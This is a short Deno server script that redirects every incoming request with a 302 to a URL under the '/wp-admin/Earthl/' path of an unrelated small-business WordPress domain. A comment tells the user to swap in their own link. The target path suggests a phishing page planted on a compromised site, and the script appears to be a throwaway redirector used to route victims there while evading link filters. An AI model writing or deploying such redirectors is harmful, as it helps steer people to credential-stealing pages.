import { serve } from "https://deno.land/std/http/server.ts";

serve((_req) => {
  return new Response(null, {
    status: 302,
    headers: {
      Location: "https://mathieu-mariac-smartcover.comhit.fr/wp-admin/Earthl/_+_==/", // Replace this with your actual link
    },
  });
});
